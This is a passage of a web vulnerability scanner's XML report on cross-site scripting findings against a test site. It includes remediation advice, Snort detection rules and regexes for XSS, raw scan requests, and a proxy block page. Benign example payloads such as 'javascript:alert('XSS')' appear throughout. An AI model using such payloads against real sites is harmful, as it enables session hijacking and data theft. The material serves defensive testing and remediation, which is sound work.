</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="4AC9AF0DF3408621F05AF28CD51B37CE"><![CDATA[GET /pictures/6.jpg.tn/%38%38%35%37%34 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4AC9AF0DF3408621F05AF28CD51B37CE";PSID="B219613770D223B9C34337D7F6EBA383";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2538%2535%2537%2534";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="ce96ffd6";
X-Request-Memo: ID="9300568b";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 403 URLBlocked-Serpro
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Connection: keep-alive
Content-Type: text/html
Cache-Control: no-cache
Content-Length: 3665
X-Frame-Options: deny

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/6.jpg.tn/88574");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:50</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></RawResponse><Request id="4AC9AF0DF3408621F05AF28CD51B37CE"><Method>GET</Method><Path>/pictures/6.jpg.tn/</Path><File>%38%38%35%37%34</File><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="4AC9AF0DF3408621F05AF28CD51B37CE";PSID="B219613770D223B9C34337D7F6EBA383";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2538%2538%2535%2537%2534";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="ce96ffd6";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="9300568b";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>403</StatusCode><StatusDescription>URLBlocked-Serpro</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<!-- FileName: index.html
     Language: [en]
-->
<!--Head-->
<head>
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
  <meta http-equiv="X-UA-Compatible" content="IE=7" />
  <title>McAfee Web Gateway - Notification</title>
  <script src="/mwg-internal/de5fs23hu73ds/files/javascript/sw.js" type="text/javascript" ></script>
  <link rel="stylesheet" href="/mwg-internal/de5fs23hu73ds/files/SerproSchema/stylesheet.css" />
</head>
<!--/Head-->
<!--Body-->
<body onload="swOnLoad();">
  <table class='bodyTable'>
    <tr>
      <td class='bodyData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/bg_body.gif'>
<!--Logo-->
<table class='logoTable'>
  <tr>
    <td class='logoData'>
      <a href='http://www.serpro.gov.br'>
        <img src='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-logo.png'></a>
    </td>
  </tr>
</table>
<!--/Logo-->
<!--Contents-->
<!-- FileName: URLBlocked.html
     Language: [en]
-->
<!--Title-->
<table class='titleTable' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
  <tr>
    <td class='titleData'>
     Bloqueado pelo Filtro de Conteúdo do Serpro
    </td>
  </tr>
</table>
<!--/Title-->

<!--Content-->
<table class="contentTable">
  <tr>
    <td class="contentData">
    <body>
   </body>
     A URL solicitada foi bloqueada pelo Filtro de Paginas do Serpro. A Pagina está listada em categorias que não são permitidas.
    </td>
  </tr>
</table>
<!--/Content-->

<!--Info-->
<table class="infoTable">
  <tr>
    <td class="infoData">
      <b>Pagina: </b><script type="text/javascript">break_line("http://php.vulnweb.com/pictures/6.jpg.tn/88574");</script><br />

        <script type="text/javascript">
          writeToDocument("<b>Categoria da Pagina: </b>" + "Internet Services, Parked Domain" );
        </script><br />
      <b>Reputação: </b>Unverified<br />
      <b>Tipo de Midia: </b><br />
      <b>Usuario Autenticado: </b><br />
     <b>IP Cliente: </b>10.40.3.62<br />
       <b>Appliance Name: </b>BSAFCWMWG07<br />
<br/>
<small>
<script type="text/javascript">
    if(true){
        writeToDocument("URL was blocked due to a <b>GTI Reputation and Categorization lookup</b>.");
    } else if (false)  {
        writeToDocument("URL was blocked due to a <b>dynamic content classification</b>.");
    } else {
        writeToDocument("URL was blocked due to a <b>local database</b> or <b>cloud cache lookup</b>.");
    }

    if (false)  {
        writeToDocument(" A <b>forward DNS lookup</b> was also involved.");
    } else if (false)  {
        writeToDocument(" A <b>reverse DNS lookup</b> was also involved.");
    }
</script>
</small>
    </td>
  </tr>
</table>
<!--/Info-->


<!--/Contents-->
<!--Policy-->
<table class='policyTable'>
  <tr>
    <td class='policyHeading'>
      <hr>
      Politica de acesso SERPRO
    </td>
  </tr>
  <tr>
    <td class='policyData'>
     
    </td>
  </tr>
</table>
<!--/Policy-->
<!--Foot-->
<table class='footTable'>
  <tr>
    <td class='helpDeskData' background='/mwg-internal/de5fs23hu73ds/files/SerproSchema/img/serpro-barra.jpg'>
      Para assistência abrir chamado via GOVI - <a href='http://www.sccd.serpro'> www.sccd.serpro .
    </td>
  </tr>
  <tr>
    <td class='footData'>
      gerado <span id="time">2020-12-11 18:54:50</span> by Serpro
      <br />
      Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
    </td>
  </tr>
</table>
<!--/Foot-->
      </td>
    </tr>
  </table>
</body>
<!--/Body-->
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Cache-Control</Name><Value>no-cache</Value></Header><Header><Name>Content-Length</Name><Value>3665</Value></Header><Header><Name>X-Frame-Options</Name><Value>deny</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="99E4C81ACF9EE613E0B1284B6884E404"><URL>http://php.vulnweb.com:80/pictures/5.jpg.tn/%33%35%38%34%38</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="5f51547c-d499-4742-af76-b62f27903a90"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/5.jpg.tn/%33%35%38%34%38 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="99E4C81ACF9EE613E0B1284B6884E404";PSID="B0FAAD259EA0EB4318492E36606967F8";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2533%2535%2538%2534%2538";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="50e034ed";
X-Request-Memo: ID="40beb8da";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
